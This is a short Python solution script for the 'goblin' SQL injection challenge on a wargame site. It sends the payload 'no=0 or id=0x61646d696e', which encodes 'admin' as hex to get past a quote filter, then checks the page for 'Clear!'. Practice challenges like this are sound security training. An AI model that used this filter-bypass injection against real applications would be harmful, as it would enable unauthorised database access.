#!/usr/bin/env python3

'''
# Summary
- if we can not use ' (quote), we can set id=admin as hex values
'''


import requests

header = {"Cookie": "PHPSESSID=vdnm7k113d0u7ignerl94hf2o5;"}
url = "https://los.rubiya.kr/chall/goblin_e5afb87a6716708e3af46a849517afdc.php"

payload = "?no=0 or id=0x61646d696e"

response = requests.get(url + payload, headers=header)

result = response.text
if result.find("Clear!") != -1:
    end = result.split("Clear!")[0].split("<h2>")[1]
    print(end+"Clear!")